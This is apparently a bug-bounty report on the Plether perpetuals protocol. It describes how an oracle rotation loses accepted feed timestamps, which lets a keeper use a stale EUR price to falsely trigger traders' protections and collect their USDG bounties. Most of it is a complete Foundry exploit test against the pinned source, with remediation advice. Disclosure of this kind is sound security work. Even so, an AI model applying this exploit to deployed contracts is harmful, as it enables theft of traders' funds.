# \#99029 [SC-Critical] Oracle rotation resets accepted feed timestamps, enabling false protection closes and keeper USDG theft

**Submitted on Nov 11th 2026 at 14:26:26 UTC by @Psyone for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99029
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
A legitimate 72-hour owner rotation installs a fresh PletherOracle without the active Oracle's accepted per-feed timestamp floor. A permissionless keeper who supplies a still-fresh, older signed component as the first post-rotation basket can falsely trigger an armed protection, take its reserved USDG bounty, and force a full close. In the attached release-configuration Foundry proof, two traders each lose a 0.20 USDG bounty and both positions close at a later honest mark that is above their trigger threshold.

## Vulnerability Details
At the pinned commit a82d4fefb02768e5b3bddcc97dee371eee24fea8, packages/perps/src/router/OrderLiquidationBatchLogic.sol:518-529 copies only six mutable policy fields during OrderRouterAdmin.finalizeOracleConfig. It does not migrate PletherOracle's accepted prices, accepted basket, or hasAcceptedBasket flag. The Router then switches its Oracle pointer (OrderRouter.sol:415-420).

PletherOracle.sol:758-799 parses current signed Pyth updates in the 15-second live window. Its per-feed nonregression check at lines 776-779 runs only when this particular Oracle instance hasAcceptedBasket. The fresh candidate starts false. It can therefore accept an EUR observation at T-1 even though the old Oracle had already accepted EUR at T. Five other feed observations at T+1 make the basket publishTime T+1, so the Engine's aggregate-time guard accepts the update and PositionProtectionBook.activate sees a time later than the armed time. The old Oracle rejects the identical payload with PletherOracle__FeedTimeOutOfOrder(EUR,T-1,T).

The test uses the release's six FX feed IDs, weights, bases, inversion flags, risk parameters, 0.20 USDG protection bounty, and one-basis-point confidence per feed. A one-basis-point older EUR price at T-1 changes the neutral basket mark from 100,000,000 to 99,994,240 at T+1, crossing an armed 99,997,000 threshold. The two-second component-time gap is within the live policy. Both traders opened through public V3 Router commit/execute and armed protections through the public Book. The owner follows the ordinary timelocked proposal/finalization flow. A second test replaces the Pyth endpoint, an operational rotation described in SECURITY.md, while keeping all six market semantics identical. Both variants pass. A test-only candidate-seeding control makes the same stale payload revert, isolating the missing accepted-time floor.

## Impact Details
The first false trigger transfers 200,000 six-decimal USDG atoms from the first trader's reserved protection bounty to the keeper, who withdraws them as tokens. The keeper then triggers a second armed trader from the newly accepted cached basket with empty Pyth update data and no additional Pyth parse; a second 200,000 atoms are credited and withdrawn. Total measured direct theft is 400,000 atoms = 0.40 USDG. Both queued full closes later execute at a coherent mark above the original threshold and leave both positions with zero size. I do not claim a quantified additional PnL or fee loss. This matches the program's Critical impact: direct theft of any user funds, other than unclaimed yield. If the team treats the small bounty as economically unrecoverable, Medium griefing is the alternative impact.

The attack needs a valid signed EUR update at T-1 and other signed updates at T+1, an ordinary owner rotation finalized while that older component is still in the 15-second live window, and the keeper winning the first accepted-basket update on the replacement. The keeper cannot rotate the Oracle or forge Pyth signatures. The program permits MockPyth in a pinned-source PoC; this proof does not claim a captured production signed pair or a live mainnet exploit. Foundry measured approximately 1.22-1.24 million gas units for the first trigger and 0.797 million for the empty-data replay; actual Arbitrum L1 posting fees, Pyth/Hermes costs, and net profit were not established.

## Prior audit and known-issue distinction
Cecuro MED-7 is the closest public finding. It acknowledges selection of older valid signed components inside the window but says the per-feed accepted timestamp cannot move backwards. This report crosses an already accepted on-chain timestamp floor: the active Oracle rejects the exact payload, and the fresh rotated Oracle accepts it. The accepted-cache change first appears in commit 81919218; a byte-identical Oracle-level test on its parent 2da338a8, on 81919218, and on the pinned commit shows the former shared-Pyth-storage floor survives same-endpoint rotation while the latter two lose it. That is why the competition's incomplete-fix/new-bug exception may apply. I recognize that triage could group the behavior more broadly under MED-7.

MED-13 concerns changed Oracle market semantics retargeting armed thresholds; this PoC keeps all economic feed semantics fixed. MED-18 concerns unequal aggregate marks at the same basket timestamp; here the aggregate timestamp advances. MED-23's newest-component clock fix assumes per-feed nonregression. LOW-38 concerns invalid endpoint validation. I reviewed all five checked-in audit/scan artifacts and found no express description of accepted-history loss across rotation. My prior Plether reports #98839, #98424, and #98222 involve different roots.

## References and remediation
Pinned source: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L758-L799
Rotation: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L518-L529
Prior audit: https://raw.githubusercontent.com/immunefi-team/audit-comp-plether/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf
Preserve or enforce the active Oracle's accepted per-feed time floor across compatible rotations. Alternatively, block price-sensitive protection triggers until a coherent candidate basket has been validated against the old floor. Copying policy fields alone is insufficient.

## Proof of Concept

## Reproduce on the pinned source
1. Check out immunefi-team/audit-comp-plether at a82d4fefb02768e5b3bddcc97dee371eee24fea8 and install its Foundry dependencies. Do not modify packages/perps/src.
2. Save the complete source below as packages/perps/test/perps/spec/trader/RotationWatermark74.t.sol. Its SHA-256 is b36fe9b1babc8343c81c89093aedba5643ec0eaeaaa532e0cce4bfa3e1996ff1.
3. From packages/perps, run: forge test --match-path test/perps/spec/trader/RotationWatermark74.t.sol -vv
4. Both tests must pass (same Pyth endpoint and replacement endpoint). Each shows an old-Oracle FeedTimeOutOfOrder revert, a fresh-Oracle false mark of 99,994,240 below the 99,997,000 threshold, two 200,000-atom keeper bounty withdrawals, no second Pyth parse on empty-data replay, and two complete closes at a later coherent mark above the threshold. The test-only candidate-seeding branch is a counterfactual control, not part of the attack.

## Complete Foundry test
~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract RotationWatermark74Test is BasePerpTest {

    address private constant TRADER = address(0xA11CE);
    address private constant SECOND_TRADER = address(0xB0B);
    address private constant KEEPER = address(0xBEEF);
    uint256 private constant TAKE_PROFIT = 99_997_000;
    uint256 private constant BOUNTY = 200_000;
    uint256 private constant POSITION_SIZE = 10_000e18;

    bytes32[6] private ids = [
        bytes32(0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b),
        bytes32(0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52),
        bytes32(0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1),
        bytes32(0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca),
        bytes32(0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676),
        bytes32(0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8)
    ];
    uint256[6] private weights = [uint256(0.576e18), 0.136e18, 0.119e18, 0.091e18, 0.042e18, 0.036e18];
    uint256[6] private bases = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function test_IdenticalSixFeedRotation_StaleComponentTriggersAndPays() public {
        _runScenario(false);
    }

    function test_EndpointReplacement_StaleComponentTriggersAndPays() public {
        _runScenario(true);
    }

    function _runScenario(
        bool replacePythEndpoint
    ) private {
        _fundTrader(TRADER, 20_000e6);
        _fundTrader(SECOND_TRADER, 20_000e6);
        IPositionProtectionActions protectionActions =
            IPositionProtectionActions(address(router.positionProtectionBook()));
        IPositionProtectionViews protectionViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.positionProtectionTriggerBountyAssets = BOUNTY;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        config.maxPendingOrders = 5;
        _setRouterConfig(config);

        // Build the ordinary six-feed release state before testing the second, identical rotation.
        PletherOracle sixFeedOracle = _newSixFeedOracle(address(baseMockPyth));
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig({pletherOracle: address(sixFeedOracle)}));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        assertEq(address(router.pletherOracle()), address(sixFeedOracle));

        MockPyth candidatePyth = replacePythEndpoint ? new MockPyth() : baseMockPyth;
        PletherOracle replacement = _newSixFeedOracle(address(candidatePyth));
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig({pletherOracle: address(replacement)}));
        // The owner chooses an ordinary open-market Monday after the 72-hour timelock.
        uint256 t = SETUP_TIMESTAMP + 14 days;
        assertGt(t, routerAdmin.oracleConfigActivationTime());
        vm.warp(t - 2);
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_data(t - 2, false));
        uint64 openOrderId = _commitOpen(TRADER);
        uint64 secondOpenOrderId = _commitOpen(SECOND_TRADER);
        vm.warp(t - 1);
        vm.roll(vm.getBlockNumber() + 1);
        OrderV3Types.ExecutionResult memory openResult = router.executeOrder(openOrderId, _data(t - 1, false));
        assertEq(uint8(openResult.terminalReason), uint8(OrderV3Types.TerminalReason.Executed));
        openResult = router.executeOrder(secondOpenOrderId, _data(t - 1, false));
        assertEq(uint8(openResult.terminalReason), uint8(OrderV3Types.TerminalReason.Executed));
        (uint256 openedSize,,,,,,) = engine.positions(TRADER);
        assertEq(openedSize, POSITION_SIZE);
        (openedSize,,,,,,) = engine.positions(SECOND_TRADER);
        assertEq(openedSize, POSITION_SIZE);

        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_data(t, false));
        if (replacePythEndpoint) {
            // A live replacement endpoint already holds the same six current observations.
            // Its storage does not initialize PletherOracle's accepted-price cache.
            _populateEndpoint(candidatePyth, t);
        }
        assertTrue(sixFeedOracle.hasAcceptedBasket());
        assertFalse(replacement.hasAcceptedBasket());
        uint256 cleanMark = engine.lastMarkPrice();
        assertGt(cleanMark, TAKE_PROFIT);

        vm.prank(TRADER);
        uint64 protectionId = protectionActions.createPositionProtection(_params());
        vm.prank(SECOND_TRADER);
        uint64 secondProtectionId = protectionActions.createPositionProtection(_params());
        assertEq(router.getAccountReservations(TRADER).executionBountyAssets, BOUNTY);
        assertEq(router.pendingOrderCounts(TRADER), 0);

        vm.warp(t + 1);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory regressed = _data(t + 1, true);
        vm.prank(KEEPER);
        vm.expectRevert(
            abi.encodeWithSelector(IPletherOracle.PletherOracle__FeedTimeOutOfOrder.selector, ids[0], t - 1, t)
        );
        protectionActions.triggerPositionProtection(protectionId, regressed);
        assertEq(router.pendingOrderCounts(TRADER), 0);

        // Causal control: emulate a hypothetical watermark migration by seeding the candidate.
        // The Router-pranked direct oracle call is test-only and unavailable before production rotation.
        uint256 snapshot = vm.snapshotState();
        vm.prank(address(router));
        replacement.updatePrice(address(this), _data(t, false), IPletherOracle.PriceMode.MarkRefresh);
        routerAdmin.finalizeOracleConfig();
        vm.prank(KEEPER);
        vm.expectRevert(
            abi.encodeWithSelector(IPletherOracle.PletherOracle__FeedTimeOutOfOrder.selector, ids[0], t - 1, t)
        );
        protectionActions.triggerPositionProtection(protectionId, regressed);
        assertEq(router.pendingOrderCounts(TRADER), 0);
        assertEq(router.getAccountReservations(TRADER).executionBountyAssets, BOUNTY);
        assertTrue(vm.revertToState(snapshot));
        assertEq(address(router.pletherOracle()), address(sixFeedOracle));
        assertFalse(replacement.hasAcceptedBasket());

        // Trusted owner finalizes. An unrelated keeper then wins the first update race.
        routerAdmin.finalizeOracleConfig();
        assertEq(address(router.pletherOracle()), address(replacement));
        assertFalse(replacement.hasAcceptedBasket());
        uint256 keeperInternalBefore = clearinghouse.getAccountAssetBuckets(KEEPER).settlementBalanceAssets;
        uint256 keeperTokenBefore = settlementToken.balanceOf(KEEPER);
        uint256 gasBeforeTrigger = gasleft();
        vm.prank(KEEPER);
        uint64 orderId = protectionActions.triggerPositionProtection(protectionId, regressed);
        emit log_named_uint("first trigger gas", gasBeforeTrigger - gasleft());

        PositionProtectionTypes.PositionProtectionView memory p = protectionViews.getPositionProtection(protectionId);
        assertEq(uint8(p.status), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
        assertEq(p.linkedOrderId, orderId);
        assertLt(p.triggerMarkPrice, TAKE_PROFIT);
        assertEq(p.triggerPublishTime, t + 1);
        assertEq(router.pendingOrderCounts(TRADER), 1);
        assertEq(router.pendingCloseSize(TRADER), POSITION_SIZE);
        assertEq(clearinghouse.getAccountAssetBuckets(KEEPER).settlementBalanceAssets - keeperInternalBefore, BOUNTY);
        assertEq(router.getAccountReservations(TRADER).executionBountyAssets, 0);
        emit log_named_uint("clean mark", cleanMark);
        emit log_named_uint("false trigger mark", p.triggerMarkPrice);
        emit log_named_uint("keeper internal bounty", BOUNTY);

        vm.prank(KEEPER);
        clearinghouse.withdrawMargin(BOUNTY);
        assertEq(settlementToken.balanceOf(KEEPER) - keeperTokenBefore, BOUNTY);
        emit log_named_uint("keeper token withdrawal", BOUNTY);

        // A second armed account can be triggered from the just-accepted basket without another Pyth parse.
        uint256 parseCallsBeforeReplay = candidatePyth.parseCallCount();
        gasBeforeTrigger = gasleft();
        vm.prank(KEEPER);
        uint64 secondOrderId = protectionActions.triggerPositionProtection(secondProtectionId, new bytes[](0));
        emit log_named_uint("second replay trigger gas", gasBeforeTrigger - gasleft());
        assertEq(candidatePyth.parseCallCount(), parseCallsBeforeReplay);
        assertEq(router.pendingOrderCounts(SECOND_TRADER), 1);
        assertEq(router.pendingCloseSize(SECOND_TRADER), POSITION_SIZE);
        assertEq(clearinghouse.getAccountAssetBuckets(KEEPER).settlementBalanceAssets, BOUNTY);
        assertEq(secondOrderId, orderId + 1);
        assertEq(router.getAccountReservations(SECOND_TRADER).executionBountyAssets, 0);
        emit log_named_uint("replayed second bounty", BOUNTY);

        vm.prank(KEEPER);
        clearinghouse.withdrawMargin(BOUNTY);
        assertEq(settlementToken.balanceOf(KEEPER) - keeperTokenBefore, 2 * BOUNTY);
        assertEq(clearinghouse.getAccountAssetBuckets(KEEPER).settlementBalanceAssets, keeperInternalBefore);
        emit log_named_uint("keeper total token withdrawal", 2 * BOUNTY);

        // Execute the wrongly queued close against a coherent, non-triggering basket.
        vm.warp(t + 2);
        vm.roll(vm.getBlockNumber() + 1);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _data(t + 2, false));
        emit log_named_uint("execution terminal reason", uint8(result.terminalReason));
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Executed));
        assertGt(engine.lastMarkPrice(), TAKE_PROFIT);
        (uint256 remaining,,,,,,) = engine.positions(TRADER);
        assertEq(remaining, 0);
        result = router.executeOrder(secondOrderId, _data(t + 2, false));
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Executed));
        (remaining,,,,,,) = engine.positions(SECOND_TRADER);
        assertEq(remaining, 0);
        assertGt(engine.lastMarkPrice(), TAKE_PROFIT);
    }

    function _newSixFeedOracle(
        address pythEndpoint
    ) private returns (PletherOracle oracle) {
        bytes32[] memory feedIds = new bytes32[](6);
        uint256[] memory quantities = new uint256[](6);
        uint256[] memory basePrices = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        for (uint256 i; i < 6; ++i) {
            feedIds[i] = ids[i];
            quantities[i] = weights[i];
            basePrices[i] = bases[i];
        }
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
        oracle = new PletherOracle(
            address(engine), address(pool), pythEndpoint, feedIds, quantities, basePrices, inversions
        );
    }

    function _populateEndpoint(
        MockPyth endpoint,
        uint256 publishTime
    ) private {
        for (uint256 i; i < 6; ++i) {
            uint256 raw = (i == 1 || i == 3 || i == 4 || i == 5) ? 1e16 / bases[i] : bases[i];
            endpoint.setPrice(ids[i], int64(uint64(raw)), uint64(raw / 10_000), -8, publishTime);
        }
    }

    function _commitOpen(
        address account
    ) private returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encodePacked("rotation-open", account));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = 2000e6;
        request.targetPrice = 1;
        request.bounds.submitBy = uint64(block.timestamp + 60);
        request.bounds.executionWindowSeconds = 60;
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
        vm.prank(account);
        orderId = router.commitOrder(request);
    }

    function _data(
        uint256 currentTime,
        bool regressEur
    ) private view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 raw = (i == 1 || i == 3 || i == 4 || i == 5) ? 1e16 / bases[i] : bases[i];
            uint256 tickTime = currentTime;
            if (i == 0 && regressEur) {
                raw = raw * 9999 / 10_000; // A 1bp older tick moves the 57.6%-weight component.
                tickTime = currentTime - 2; // At T+1, this is T-1: inside the inclusive live window.
            }
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(raw)), uint64(raw / 10_000), -8, tickTime, tickTime - 1)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _params() private pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params.takeProfitTriggerPrice = TAKE_PROFIT;
        params.stopLossTriggerPrice = 0;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

}
~~~

Observed independent result: 2 passed; 0 failed; 0 skipped, on pinned a82d4fef with unchanged production Solidity. This uses program-permitted MockPyth and mock USDG, not live signed blobs or a public-network transaction.

